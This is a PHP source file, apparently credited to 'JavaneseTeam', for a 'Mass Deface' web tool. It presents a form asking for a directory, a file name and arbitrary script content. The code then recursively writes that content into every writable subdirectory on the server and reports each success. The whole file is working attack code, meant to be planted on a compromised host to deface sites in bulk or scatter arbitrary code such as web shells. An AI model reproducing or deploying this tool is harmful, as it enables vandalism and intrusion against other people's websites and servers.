<?php
###############################################################################
// Coded: Simsimi
// http://javaneseteam.com (Coming Soon)
// FB: Alexangentod
###############################################################################
function NF($f,$sc){
$fp2 = fopen($f,"w");
fputs($fp2,$sc);
}
function OD($gcwd){
	if(is_writable($gcwd)){
	$FN = $_POST['nama'];
	$sc = $_POST['script'];
	$a = scandir("$gcwd");
foreach($a as $A2){
	if($A2 == "." | $A2 == ".."){
	}elseif(is_dir("$gcwd/$A2")){
       $ND = "$gcwd/$A2";
		if(is_writable($ND)){
		echo "<style>body{background-color:black;}</style><font color=blue>$ND/$FN <font color=lime><-- Sukses !<br>";
		$cf = NF("$ND/$FN", "$sc");
		$B = OD($ND);
 }
else{
	echo "Dir not Writeable";
	}
}
}	
}
else{
	echo "Dir not Writeable";
}
}
if($_POST){
$C = $_POST['dir'];
$Y = OD($C);
echo $Y;
}
else{
	echo '<html>
<head>
<title>Mass Deface</title>
</head>
<body background = "https://j.top4top.io/p_15720jsja0.png">
<center>
<table><br><br><br><br><font color="yellow" size="2">Path Now<br>'.getcwd().'</font>
<tr><td><form method="post" action="?action"></td></tr>
<tr><td><input class="sd" type="text" name="dir" placeholder="/home/user/public_html/"></td> </tr>
<tr><td><input class="sd" type="text" name="nama" placeholder="xixi.html"></td> </tr>
<tr><td><br><textarea class="sd" rows="10" cols="21px" name="script" placeholder="Your Script"></textarea></td></tr>
<br><tr><td><br><input class="gas" type="submit" value="Submit"></td></tr>
</form>
</table>';
echo"<br><font color=white>Coded By JavaneseTeam</a></font></center>";

}
?>
